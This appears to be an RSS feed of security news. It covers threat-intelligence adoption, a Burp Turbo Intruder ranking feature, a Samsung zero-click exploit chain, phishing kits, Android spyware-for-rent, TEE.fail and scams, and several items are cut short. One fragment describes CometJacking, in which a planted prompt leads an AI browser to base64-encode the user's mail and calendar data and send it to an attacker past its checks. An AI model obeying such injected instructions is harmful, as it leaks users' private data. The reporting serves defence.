tool. Increasingly, enterprises are using threat intelligence to determine areas of investment, security tool purchasing, which supply chain or third party vendors to work with, and even how they train their employees.Rather than looking at threat intelligence as a kind of routine reporting reserved for security teams, organizations are beginning to see its value in broader business decisionmaking. Today, threat intelligence is being used across the enterprise, informing decisions from the board and executive levels all the way down to day-to-day security operations.With our 2025 State of Threat Intelligence report finding that 83% of organizations now run full-time threat intelligence teams, and most use intelligence to guide daily or weekly operations, it’s clear that what once began as a tactical advantage has now become a strategic necessity.A Seat at the Boardroom Table: The Strategic Maturation of Threat IntelligenceThese changes constitute a true paradigm shift in today’s enterprise security operations. In relatively short order, threat intelligence has evolved from just another security tool to an essential source of information for business strategy. So, what fueled this change?Threat intelligence was once the domain of analysts hunched over indicators and dashboards. But as cyber risk began shaping balance sheets and brand value, intelligence moved beyond the SOC. Today, it informs everything from vulnerability management and incident response to compliance, insurance, and executive protection. The same datasets that once helped detect intrusions now guide procurement choices, risk modeling, and crisis communication plans.As a result, we are seeing threat intelligence used by more than just security teams. It is now being used by governance, risk & compliance (GRC) teams, fraud teams, physical security teams, marketing and communications teams, and perhaps most importantly, by executive leadership teams and board leadership.Modern threat intelligence shifts the narrative from “are we secure?” to “how much risk can we tolerate?” We're never going to reach zero risk. But with threat intelligence, we can ensure that we're operating at an acceptable level, where we can keep under control those things that would cause business disruption, competitive disadvantage, financial implications or regulatory failures.In our 2025 State of Threat Intelligence Report, Recorded Future found that nearly three-quarters (73%) of surveyed security professionals report using threat intelligence, along with 48% of Incident response teams, 47% of risk management teams, and 46% vulnerability management teams.This continued spread of threat intelligence across business functions signals a shift from threat intelligence as a tool for optimizing defensive posture to one for optimizing strategic integration and risk management.The Board’s New Dashboard: Threat Intelligence as a Business TranslatorAs the board’s appetite for timely, relevant risk insight grows, threat intelligence provides a vital bridge between technical data and strategic clarity. Boards are increasingly demanding information and briefings that translate adversarial behavior into plain-language impacts, such as:Threat Intelligence-informed presentations shaping risk committee agendasExecutive protection and brand monitoring as extensions of enterprise intelligenceThreat Intelligence-driven prioritization of cybersecurity budgets and third-party vettingWe can see these new applications play out in routine, yet vital, processes across the modern enterprise. Consider the following two scenarios and how they illustrate the ways in which threat intelligence is being used to determine executive and board-level decision-making:High-risk, high-impact threats (like ransomware campaigns or geopolitical disruption) trigger strategic investment in contingency planning and data redundancy, and/or decisions around where to do business.Persistent but lower-impact risks may inform tolerance thresholds or shape insurance coverage decisions.These examples demonstrate how intelligence enables boards to truly act on risk, not just acknowledge it. With these tools, organizations are now able to use threat intelligence to decide which businesses to work with, which technologies to bring on board, and whether or not the business can expand into new regions safely and effectively.Enterprises are increasing threat intelligence spend as security shifts from reactive defense to a holistic, intelligence-driven strategy. Modern intelligence helps detect attacks sooner, prioritize critical risks, and respond faster—strengthening vulnerability management, incident response, and board-level risk decisions. With ransomware, supply-chain attacks, and regulatory pressure on the rise, intelligence is now central to smarter, faster, and more effective enterprise-wide action.2025 State of Threat Intelligence ReportIntelligence as the Backbone of Enterprise Agility: How Threat Intelligence Keeps Orgs On Their ToesWhereas in the past, an organization might use threat intelligence to inform their security posture, today, threat intelligence is being used in a much more holistic way, directly powering overall enterprise adaptability, resilience, and governance outcomes.In today’s rapidly changing threat landscape—with the growth of advanced, AI-enabled threats, supply-chain attacks, and shifting global regulations—boards can no longer afford to rely on static risk models. And it is comprehensive, timely, and relevant threat intelligence that helps keep today’s models dynamic.The majority of organizations today use threat intelligence to guide business decisions related to purchasing, risk assessment, and resource allocation. In our 2025 State of Threat Intelligence Report, Recorded Future found that:Nearly two-thirds (65%) of surveyed security professionals say threat intelligence directly supports security technology purchasing decisions58% say it guides risk assessment for business initiatives53% say it supports incident response resource allocationWith all of these figures representing year-over-year increases, it’s safe to say that the majority of organizations have already adopted this more holistic view of threat intelligence. And for those that haven’t, all signs seem to suggest that they soon will. At the very least, we can say that they certainly ought to.Intelligence-Driven Governance Is Essential for Modern Risk ManagementThe widespread adoption of threat intelligence across operations (including board-level decision-making) marks a turning point in how organizations perceive risk and value intelligence. No longer confined to security operations, threat intelligence is now a cornerstone of enterprise governance—a means of continuously informing executive and board-level risk decisions with clarity and confidence.In both its capabilities and its applications, threat intelligence has evolved dramatically over recent years, maturing from a reactive tool to a foundation for informed risk decisionmaking across the enterprise. From the SOC team, to the C-suite, and all the way to the board, threat intelligence is being used to inform a wide range of critical business decisions. With this larger shift in security from a reactive defense to a holistic, intelligence-driven strategy engine, enterprises are expanding their understanding and use of threat intelligence and seeing meaningful benefits as a result.Interested in making modern threat intelligence a part of your board’s operations?

If you've ever used Burp Intruder or Turbo Intruder, you'll be familiar with the ritual of manually digging through thousands of responses by repeatedly sorting the table via length, status code, etc. I've developed an algorithm called HTTP Anomaly Rank which can efficiently pick out the most interesting responses for you.

HTTP Anomaly Rank is now integrated into Turbo Intruder and automatically places the most anomalous findings at the top of the results table without you needing to lift a finger.

We've also integrated this algorithm into Burp Suite's API in release 2025.10, so you can easily use it in your own tools. Since it can efficiently sift through massive result sets, it's particularly useful for anyone who wants to build AI based features.

In this post I'll explain how the algorithm works in depth but first, here's a quick demo:

HTTP Anomaly Rank evolved from the diffing logic I developed during my Backslash Powered Scanner: Automating Human Intuition research back in 2016. I built Backslash Powered Scanner to discover unknown injection vulnerability classes by recognising subtle differences in responses to payload pairs such as " vs ". Accurately diffing HTTP responses is a notoriously difficult problem as they're often very noisy, but I eventually found a reliable approach based on calculating a large number of response attributes (think status code, line count, exact byte sequence...), identifying which ones are stable, and using these for response comparison. This let me answer the question "Are the responses to these two payloads consistently different", and automate discovery of some really nice vulnerabilities. Check out the whitepaper and presentation for the full details.

HTTP Anomaly Rank scores every response based on how different it is from the others. First, it calculates a weight for every attribute based on how stable it is.

PayloadStatusContent-TypeWord-countCRC32administrator403text/html812d753916dadmin403text/html8125129f3bdsales503text/html97710639dbaccounting200text/html8123978f20fADMIN403text/html8119fa1cbc1root503text/html9727df2486test403text/html812e45449e7

For example, consider the response set above.

The algorithm then looks at every response, and assigns it a score based on how unique the attribute values seen on that response are, combined with how unique it is. In this example, ADMIN ends up with the highest score because it has a unique word-count.

This approach means it can detect and flag responses with tiny discrepancies, even when the overall response content is very noisy - check the video above for an example.

The score increases in accuracy as we collect more responses. The calculation is quite computationally heavy but the algorithmic complexity is O(N) so it scales well. In Turbo Intruder, I made the score only get calculated when the attack is completed to minimise wasted CPU cycles.

Part of my vision for Turbo Intruder is to require as few user clicks as possible. To help achieve this, it will now automatically sort the results table by the anomaly rank column when the attack completes. Hopefully this strategy works for you but if not, you can override it and automatically sort by any column of your choice using table.setSortOrder()

I'm looking forward to announcing some more quality of life updates for Turbo Intruder soon!

If you see the "Anomaly Rank" column but it's always set to 0, that means you need to update Burp Suite. This feature is available in 2025.10 and later.

Let me know how you find it, and if you'd like this feature in Burp Intruder too.

Enjoy!]]></content:encoded></item><item><title>Samsung zero-day lets attackers take over your phone</title><link>https://www.malwarebytes.com/blog/news/2025/11/patch-now-samsung-zero-day-lets-attackers-take-over-your-phone</link><author></author><category>threatintel</category><pubDate>Tue, 11 Nov 2025 14:28:04 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[So, for many cybersecurity professionals, CISA adding this vulnerability to the list signals both urgency and confirmation of active, real-world exploitation.CVE-2025-21042 was reportedly exploited as a remote code execution (RCE) zero-day to deploy LANDFALL spyware on Galaxy devices in the Middle East. But once that happens, other criminals tend to quickly follow with similar attacks.The flaw itself is an out-of-bounds write vulnerability in Samsung’s image processing library. These vulnerabilities let attackers overwrite memory beyond what is intended, often leading to memory corruption, unauthorized code execution, and, as in this case, device takeover. CVE-2025-21042 allows remote attackers to execute arbitrary code—potentially gaining complete control over the victim’s phone—without user interaction. No clicks required. No warning given.Samsung patched this issue in April 2025, but CISA’s recent warning highlights that exploits have been active in the wild for months, with attackers outpacing defenders in some cases. The stakes are high: data theft, surveillance, and compromised mobile devices being used as footholds for broader enterprise attacks.​The exploitation playbook is as clever as it is dangerous. According to research from Unit 42, criminals (likely private-sector offensive actors operating out of the Middle East) weaponized the vulnerability to deliver LANDFALL spyware through malformed Digital Negative (DNG) image files sent via WhatsApp. DNG is an open and lossless RAW image format developed by Adobe and used by digital photographers to store uncompressed sensor data.The attack chain works like this:The victim receives a booby-trapped DNG photo file.The file, armed with ZIP archive payloads and tailored exploit code, triggers the vulnerability in Samsung’s image codec library.This is a “zero-click” attack: the user doesn’t have to tap, open, or execute anything. Just processing the image is enough to compromise the device.It’s important to know that Samsung addressed another image-library flaw, CVE-2025-21043, in September 2025, showing a growing trend: image processing flaws are becoming a favorite entry point for both espionage and cybercrime.What should users and businesses do?Our advice to stay safe from this type of attack is simple:If you haven’t updated your Samsung device since April, do so. FCEB organizations have until December 1, 2025, to comply with CISA’s operational directive.Be wary of unsolicited messages and files, especially images received over messaging apps.Download apps only from trusted sources and avoid sideloading files.Zero-days targeting mobile devices are becoming frighteningly common, but the risk can be lowered with urgent patching, awareness, and solid security controls. As LANDFALL shows, the most dangerous attacks today are often the quietest—no user action required and no obvious signs until it’s too late.Device models targeted by LANDFALL:We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>NHS providers reviewing stolen Synnovis data published by cyber criminals</title><link>https://databreaches.net/2025/11/11/nhs-providers-reviewing-stolen-synnovis-data-published-by-cyber-criminals/?pk_campaign=feed&amp;pk_kwd=nhs-providers-reviewing-stolen-synnovis-data-published-by-cyber-criminals</link><author>Dissent</author><category>databreach</category><pubDate>Tue, 11 Nov 2025 14:03:24 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Gates Down: Third Circuit Says Breaking Employer Computer Access Policies Is Not Hacking</title><link>https://databreaches.net/2025/11/11/gates-down-third-circuit-says-breaking-employer-computer-access-policies-is-not-hacking/?pk_campaign=feed&amp;pk_kwd=gates-down-third-circuit-says-breaking-employer-computer-access-policies-is-not-hacking</link><author>Dissent</author><category>databreach</category><pubDate>Tue, 11 Nov 2025 14:02:16 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>How credentials get stolen in seconds, even with a script-kiddie-level phish</title><link>https://www.malwarebytes.com/blog/threat-intel/2025/11/how-credentials-get-stolen-in-seconds-even-with-a-script-kiddie-level-phish</link><author></author><category>threatintel</category><pubDate>Tue, 11 Nov 2025 13:17:43 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[This attempt to phish credentials caught our attention, mostly because of its front-end simplicity. Even though this is a script-kiddie-level type of attack, we figured it was worth writing up—precisely because it’s so easy to follow what they’re up to.The email is direct and to the point. Not a lot of social engineering happening here.Pls kindly find the attached PO please send us PI once its available.”The sender’s address belongs to a Czechoslovakian printing service (likely compromised), and the name and phone number are fake. The target is in Taiwan.The attached  file is a tidy fake login screen that doesn’t really specify which credentials they want:The pre-filled email address in the screenshot is a fake one I added; normally it would be the target’s email.We assume the phisher welcomes any credentials entered here, and are counting on the fact that most people reuse passwords on other sites. Under the hood, the functionality of this attachment lies in this piece of JavaScript.It starts with simple checks to make sure all the fields are filled out and long enough before declaring the Telegram bot that will receive the login details.Using Telegram bots provides the phishers with several advantages:Stolen credentials are delivered instantly to the attacker via Telegram notifications. No need for the phisher to keep checking a database or inbox.Telegram is a legitimate, globally distributed messaging service, making it difficult to block.There’s no exposed web server or obvious phishing “drop site” that can be blocklisted or shut down.The last line contains a credibility trick:setTimeout(() => {window.location.assign("file:///C:/Users/USER/Downloads/Invoice_FAC_0031.pdf")}, 2000);This tries to open a file on the user’s computer after waiting 2 seconds (2,000 milliseconds). Since this file almost certainly doesn’t exist, the browser will either block the action (especially from an email or non-local file) or show an error. Either way, it will make the login attempt look more legitimate and take the user’s mind off the fact that they just sent their credentials who knows where.That’s really all there is to it, except for a bit of code that the dungeon-dweller forgot to remove during their copy-and-paste coding. Or they had no idea what it was for and left it in place for fear of breaking something.I suspect the attacker originally used this code to encrypt the credentials with a hardcoded AES (Advanced Encryption Standard) key and injection vector, then send them to their server.This attacker replaced that method with the simpler Telegram bot approach (much easier to use), but left the decryption stub because they were afraid removing it would break something.Don’t fall for phishing attemptsEven though the sophistication level of this email was low, that does not reduce the possible impact of sending the attacker your credentials.In phishing attempts like these, two simple rules can save you from lots of trouble.Don’t open unsolicited attachmentsCheck if the website address in the browser matches the domain you expect to be on (e.g. adobe.com).Other important tips to stay safe from phishing in general:Verify the sender: Always check if the sender’s email address matches what you would expect it to be. It’s not always conclusive but it can help you spot some attempts.Check through an independent channel if the sender actually sent you an attachment or a link.Keep your device and all its software updated.Use multi-factor authentication for every account you can.Use a password manager. Password managers will not auto-fill a password to a fake site, even if it looks like the real deal to you.If you already entered credentials on a page you don’t trust, change your passwords immediately. You can also upload screenshots of suspicious emails to Malwarebytes Scam Guard. It would have recognized this one as a phishing attempt.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline. If something looks dodgy to you, check if it’s a scam using Malwarebytes Scam Guard, a feature of our mobile protection products. Submit a screenshot, paste suspicious content, or share a text or phone number, and we’ll tell you if it’s a scam or legit.

Without your passcode, fingerprint or face to unlock it, it would be useless to anyone else. Now, though, some phone thieves have found a workaround, not by breaking Apple’s security, but by tricking owners into giving them the keys. The Swiss National Cyber Security Centre (NCSC) has issued a warning about phishing scams targeting iPhone owners who’ve lost their devices.Phishing for Apple ID credentialsWhen you report an iPhone as lost in Apple’s  app, you can set a custom lock-screen message that appears on the missing device. Many people include an email address or phone number in that message so a helpful stranger can contact them if the phone turns up.Unfortunately, that’s the very information scammers use to reach you. A thief (or anyone who now has the phone) can see that contact detail on the screen and send you a convincing message—usually by text, iMessage, or email—claiming to have found your device.The scam messages often include details copied from the phone itself, such as its model and color, to make it sound authentic. It also includes a link to a fake website that mimics the Find My service that Apple operates to locate lost devices. The site will ask for the victim’s Apple ID credentials.If the victim takes the bait, the thief can use those credentials to gain full access to the phone. That enables them to wipe it, returning it to factory settings for resale.Although the NCSC didn’t say so, an enterprising thief could get up to all kinds of other shenanigans. They might reset the user’s Apple ID to lock them out—even on a replacement device, access their photos (yes, including any risqué ones), read their emails and nose through their apps. In short, it would give them carte blanche to your digital life.These attacks don’t have to happen immediately. The perpetrators might text months after the device has been lost, when victims might have moved on and lowered their guard.The good news… and the badThe warning is both good and bad news. It’s good news because it shows that criminals are apparently unable to bypass Apple’s Activation Lock protection through technical means. The Activation Lock, turned on when you activate Find My, registers a device ID on Apple’s activation servers. Even if the criminals reset your device, the activation lock will still be there. Only someone with the user’s Apple ID credentials can unlock it. It’s a version of something called Factory Reset Protection (FRP) that the US mandated under the US Smart Phone Theft Prevention Act of 2015. Android phones have similar lock functionality.The warning is bad news because phone owners are human, and humans are often the easiest security system to defeat. Phishing schemes that target phone theft victims are big business. Back in 2017, security reporter Brian Krebs documented “phishing as a service” platforms that did it at scale, on a subscription basis. Vice found toolkits like ProKit for phishing to unlock phones on sale for around $75.We’ve already written about how the phone theft industry operates. Police in the UK recently uncovered a network stealing up to 40,000 phones per year. Most were shipped overseas to countries including China, where they would be used as profitably as possible. Locked phones might be broken up for parts, but a phone restored to factory settings that can be activated from scratch is far more valuable.What to do if your iPhone is stolenIgnore any messages from “Apple” claiming your lost phone has been found. The NCSC says Apple will never text or email customers about a recovered device.If you lose your phone,  right away in to lock it and display your contact message. Use a different contact number or email (not the one linked to your Apple ID or main phone) so scammers can’t use that information to target you.Protect your SIM, too: enable  immediately, and ask your carrier to  if the phone has been stolen.We can’t easily stop thieves stealing people’s phones, or control who sees our phones after they leave our hands. But a little forethought now can help you to stop criminals from accessing your digital life or selling your phone on in its current form if it does enter the underground supply chain.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline.

As the AI tool is connected to various services, an attacker leveraging the CometJacking method could exfiltrate available data.In their tests, the connected services and accessible data include Google Calendar invites and Gmail messages and the malicious prompt included instructions to encode the sensitive data in base64 and then exfiltrate them to an external endpoint.According to the researchers, Comet followed the instructions and delivered the information to an external system controlled by the attacker, evading Perplexity’s checks.]]></content:encoded></item><item><title>CISO&apos;s Expert Guide To AI Supply Chain Attacks</title><link>https://thehackernews.com/2025/11/cisos-expert-guide-to-ai-supply-chain.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi237aSL-o6s_t-xtfun1CAuoHCY2XPJAUUHpQY18pfeww9bVAJ8M1Dtu1gEtk25UoLyeCOHz6k-TFkgBB2FSp_Y3VHQAYwpJNlBy48ffsfJQgA42Jvg1kNdRR6-VBxOZNk0ZFzIB3FrSylKmccKLCnY_olvsBLdOpA2MFqqDUZchxGce_loAbyFqyjHwk/s1600/reflectiz.jpg" length="" type=""/><pubDate>Tue, 11 Nov 2025 11:58:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[AI-enabled supply chain attacks jumped 156% last year.

The incident may have led to the compromise of draft reports, economic forecasts, internal emails, and other confidential data. The attack has been attributed to the Chinese state-sponsored APT group known as Silk Typhoon.Hyundai AutoEver America was hit by a cyber attack that resulted in unauthorized access to its IT environment, exposing sensitive personal information, including names, Social Security Numbers, and driver’s license numbers. The attack, which occurred between February 22 and March 2, 2025, affected employees, customers, or users, although the exact number of affected individuals remains unclear.Swedish IT systems supplier Miljödata has suffered a data breach that resulted in the exposure and theft of personal data belonging to up to 1.5 million individuals, including names, email addresses, physical addresses, phone numbers, government IDs, and dates of birth. The incident disrupted operations across multiple Swedish municipalities, affecting both children and protected identity subjects. The stolen data was published on the dark web by the threat group Datacarry.Japanese media giant Nikkei has experienced a cyber-attack caused by malware infection. The attack resulted in unauthorized access to its Slack messaging platform, exposing the personal information of over 17,000 employees and business partners, including names, email addresses, and chat histories.Polish online loan platform SuperGrosz, operated by AIQLABS, has disclosed a breach exposing personal data of at least 10,000 customers, including names, addresses, ID and tax numbers, phone contacts, employment details, and bank account numbers. The disclosure follows a separate distributed denial-of-service (DDoS) attack on a Polish mobile payment leader Blik that disrupted instant transfers and cash withdrawals. No actor has claimed responsibility, though Polish authorities have suggested a possible Russian link to the Blik attack.SonicWall has confirmed that a state-sponsored threat actor was behind the September attack that resulted in the theft of all firewall configuration files stored in its cloud backup environment via an API call. The breach exposed encrypted credentials and device configuration data contained in those files, enabling potential targeted attacks. All customers who used the cloud backup service were affected.VULNERABILITIES AND PATCHESCheck Point Research has uncovered four critical vulnerabilities in Microsoft Teams that allow attackers to impersonate users, manipulate messages, notifications, displayed names and forge caller identities in video and audio calls. Microsoft fixed the flaws and officially tracked the notification spoofing flaw as CVE-2024-38197.Check Point Research detected an exploit that drained $128.64M from Balancer V2.

The researchers also found PROMPTFLUX, an experimental malware family that employed AI capabilities mid-execution to dynamically alter the malware’s behavior.]]></content:encoded></item><item><title>Lawsuit Alleges Ex-Intel Employee Hid 18,000 Sensitive Documents Prior to Leaving the Company</title><link>https://databreaches.net/2025/11/10/lawsuit-alleges-ex-intel-employee-hid-18000-sensitive-documents-prior-to-leaving-the-company/?pk_campaign=feed&amp;pk_kwd=lawsuit-alleges-ex-intel-employee-hid-18000-sensitive-documents-prior-to-leaving-the-company</link><author>Dissent</author><category>databreach</category><pubDate>Mon, 10 Nov 2025 13:29:43 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>HIPAA, but for non-Covered Entities?</title><link>https://databreaches.net/2025/11/10/hipaa-but-for-non-covered-entities/?pk_campaign=feed&amp;pk_kwd=hipaa-but-for-non-covered-entities</link><author>Dissent</author><category>databreach</category><pubDate>Mon, 10 Nov 2025 13:29:36 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Fantasy Hub is spyware for rent—complete with fake app kits and support</title><link>https://www.malwarebytes.com/blog/news/2025/11/fantasy-hub-is-spyware-for-rent-complete-with-fake-app-kits-and-support</link><author></author><category>threatintel</category><pubDate>Mon, 10 Nov 2025 13:26:52 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Researchers at Zimperium identified Fantasy Hub, a new Android spyware developed and sold as a subscription on Russian-language cybercrime forums.Malware-as-a-Service (MaaS) means cybercriminals rent out to malware to other criminals, complete with the infrastructure necessary to harvest and abuse stolen information. Usually, it’s up to the buyer to spread the malware, but Fantasy Hub goes a step further—it comes with full documentation, video tutorials, and a subscription model that makes it easy for even inexperienced attackers to use. Its creators provide step-by-step guides to create fake Google Play pages that imitate apps like Telegram or online banking portals, complete with realistic reviews. It’s a Remote Access Trojan (RAT) that anyone can distribute.Distribution relies heavily on social engineering and phishing. Attackers use Fantasy Hub’s templates and tools to set up convincing fake app pages, tricking users into downloading the malicious software. A “dropper” option even lets buyers upload any Android app APK and get back a modified version with Fantasy Hub added.These counterfeit apps look legitimate, and often request only a single permission: SMS access. But that permission unlocks much more. The SMS handler role bundles multiple powerful permissions: contacts, camera, and file access into a single authorization step, unlocking extensive control over the device’s messaging, contacts, and camera functions. Fantasy Hub is designed to bypass standard security checks and can remain concealed, making detection difficult for users.Once installed, Fantasy Hub can steal SMS messages, call logs, contacts, photos, and videos. It can also intercept, reply to, and delete notifications. More dangerously, it can initiate live audio and video streams using the device’s camera and microphone without the user’s consent. It’s been found in imitation banking apps, displaying fake windows to harvest user credentials such as usernames, PINs, and passwords. As part of the handy pack provided by Fantasy Hub’s creators, attackers are given tools to tailor these phishing windows for almost any banking app they wish to target.While individuals at at risk from this malware, the threat extends to organizations that use Bring Your Own Device (BYOD) policies or rely on mobile banking and work apps. A single infected phone could expose company data or communications.Fantasy Hub shows how easily cybercriminals can now buy and run complex spyware. But a few simple habits can help you stay safe:Stick to trusted sources. Download apps only from Google Play, Apple’s App Store, or the official provider. Your bank will never ask you to use another source. Use an up-to-date real-time anti-malware solution like Malwarebytes for Android, which already detects this malware as Android/Trojan.Spy.ACRF949851CC4. Does it really need the permissions it’s requesting to do the job you want it to do? Especially if it asks for SMS or camera access.Unsolicited communications. Stay wary of messages, emails, or links urging you to “update” or install outside the official app stores.We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>New Attacks Against Secure Enclaves</title><link>https://www.schneier.com/blog/archives/2025/11/new-attacks-against-secure-enclaves.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Mon, 10 Nov 2025 12:04:55 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[Encryption can protect data at rest and data in transit, but does nothing for data in use. What we have are secure enclaves. I’ve written about this before:Almost all cloud services have to perform some computation on our data. Even the simplest storage provider has code to copy bytes from an internal storage system and deliver them to the user. End-to-end encryption is sufficient in such a narrow context. But often we want our cloud providers to be able to perform computation on our raw data: search, analysis, AI model training or fine-tuning, and more. Without expensive, esoteric techniques, such as secure multiparty computation protocols or homomorphic encryption techniques that can perform calculations on encrypted data, cloud servers require access to the unencrypted data to do anything useful.Fortunately, the last few years have seen the advent of general-purpose, hardware-enabled secure computation. This is powered by special functionality on processors known as trusted execution environments (TEEs) or secure enclaves. TEEs decouple who runs the chip (a cloud provider, such as Microsoft Azure) from who secures the chip (a processor vendor, such as Intel) and from who controls the data being used in the computation (the customer or user). A TEE can keep the cloud provider from seeing what is being computed. The results of a computation are sent via a secure tunnel out of the enclave or encrypted and stored. A TEE can also generate a signed attestation that it actually ran the code that the customer wanted to run.Secure enclaves are critical in our modern cloud-based computing architectures. And, of course, they have vulnerabilities:The most recent attack, released Tuesday, is known as TEE.fail. It defeats the latest TEE protections from all three chipmakers. The low-cost, low-complexity attack works by placing a small piece of hardware between a single physical memory chip and the motherboard slot it plugs into. It also requires the attacker to compromise the operating system kernel. Once this three-minute attack is completed, Confidential Compute, SEV-SNP, and TDX/SDX can no longer be trusted. Unlike the Battering RAM and Wiretap attacks from last month—which worked only against CPUs using DDR4 memory—TEE.fail works against DDR5, allowing them to work against the latest TEEs.Yes, these attacks require physical access. But that’s exactly the threat model secure enclaves are supposed to secure against.]]></content:encoded></item><item><title>Watch out for Walmart gift card scams</title><link>https://www.malwarebytes.com/blog/scams/2025/11/watch-out-for-walmart-gift-card-scams</link><author></author><category>threatintel</category><pubDate>Mon, 10 Nov 2025 11:41:54 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[You’ve probably seen it before—a bright, urgent message claiming you’ve qualified for a $750 or $1000 Walmart gift card. All you have to do is answer a few questions. It looks harmless enough. But once you click, you find yourself in a maze of surveys, redirects, and “partner offers”—without ever actually reaching the end and claiming your prize.This so-called “survey” is part of a lead-generation and affiliate marketing scam, designed not to reward you but to harvest your data and push you through ad funnels that make money for others, at the cost of your privacy. It’s a scam because these pages rarely deliver any real gift card. What they’re after is your personal data.As you move through each step, you’re asked for details like your name, email, phone number, ZIP code and even your home address. In some cases, you’re prompted to share interests such as home repair, debt help, or insurance quotes—each answer helps categorize you for targeted marketing.Even if the page itself doesn’t steal money, that information is still valuable. It can be used to target you with more ads and offers, add you to marketing lists, or personalize follow-up contact. In other words, completing the questionnaire hands over data that can be exploited for profit—even when no gift card ever appears.In some cases, the funnel gets even more specific. For example, if the survey asks you about home projects and you say you’re planning to replace your windows, you might be redirected to what looks like a legitimate home improvement site—often just another form asking for the same details again. The whole thing is designed to keep you filling out more forms, giving up more of your data, to more websites and affiliates.These scams aren’t just annoying time-wasters. They are harvesting your data, eroding your privacy and exposing you to wider risks. Once your details are shared, they can travel far beyond that fake survey.Be resold to advertisers and data brokers, who build detailed profiles about your habits, spending, and location.Lead to a surge of spam calls, texts, and phishing emails tailored to your interests.Feed more convincing scams down the line, since criminals can now personalize their lures using real information about you.End up on unregulated marketing lists that circulate for years, keeping your data in play long after you’ve closed the page.That’s the hidden cost of a “free” gift card: each click fuels a network that profits from your identity, not your participation.Why do people fall for it?The hook is simple—free money and easy participation. But this fake Walmart promotion taps into three powerful psychological triggers:: “You’ve been selected!” sounds personal and special.The promise of low effort: Answering a few questions feels harmless.The illusion of credibility: Walmart’s branding lends legitimacy.These scams spread mainly through advertising and malvertising networks—pop-ups, spam emails, social media ads, or sketchy website banners that imitate real promotions.You might spot them alongside news articles or as “sponsored links” that sound too good to be true. Some appear via push notifications or redirects, whisking you from a real website to a fake reward page in seconds.The designs often use official logos, countdown timers, and congratulatory language to make them look like authentic brand campaigns—tricking people into lowering their guard.It’s an easy mental shortcut: “If this was fake, it wouldn’t look so professional.” That’s what these scammers count on—the appearance of legitimacy mixed with urgency and reward.These gift card offers aren’t just harmless internet fluff—they’re the front door to a sprawling network of data collection and affiliate profiteering. Each click, form, and redirect is designed to extract value from your attention and information, not to reward you.Recognizing these scams early is the best defense. Here’s how to stay safe:Be suspicious of online surveys promising big rewards. Legitimate promotions from major retailers rarely require long questionnaires or partner offers.Never give personal information to unknown pages. If a site asks for your phone number or address for a “free prize,” it’s a red flag.Use browser protection tools. Extensions like Malwarebytes Browser Guard can block known scam domains and malvertising networks before they load. Real Walmart promotions will always come from official domains (like walmart.com or survey.walmart.com), not random URLs with extra words or numbers.Stay alert and skeptical. Online quizzes and reward offers are a favorite bait for scammers. When in doubt – close the tab.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline.
